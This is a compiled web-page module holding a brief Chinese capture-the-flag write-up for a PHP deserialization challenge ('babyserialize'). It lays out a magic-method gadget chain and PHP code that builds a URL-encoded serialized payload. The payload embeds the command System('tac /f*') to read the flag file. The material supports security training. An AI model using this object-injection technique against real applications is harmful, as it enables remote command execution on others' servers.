import{_ as n,o as s,c as a,e as p}from"./app-bf957996.js";const e={},t=p(`<p>#PHP 序列化</p><p>获取 hint()</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>flag is in /
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>链：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>TianXiWei <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">=&gt;</span> Ilovetxw <span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">=&gt;</span> four <span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">=&gt;</span> Ilovetxw <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">=&gt;</span> <span class="token constant">NISA</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">NISA</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$txw4ever</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;System(&#39;tac /f*&#39;);&quot;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">TianXiWei</span>

<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$x</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Ilovetxw</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$huang</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$su</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">four</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;TXW4EVER&quot;</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$fun</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;abc&#39;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TianXiWei</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">ext</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ilovetxw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">ext</span><span class="token operator">-&gt;</span><span class="token property">huang</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">four</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">ext</span><span class="token operator">-&gt;</span><span class="token property">huang</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Ilovetxw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">ext</span><span class="token operator">-&gt;</span><span class="token property">huang</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token operator">-&gt;</span><span class="token property">su</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NISA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,6),o=[t];function l(c,i){return s(),a("div",null,o)}const r=n(e,[["render",l],["__file","babyserialize.html.vue"]]);export{r as default};
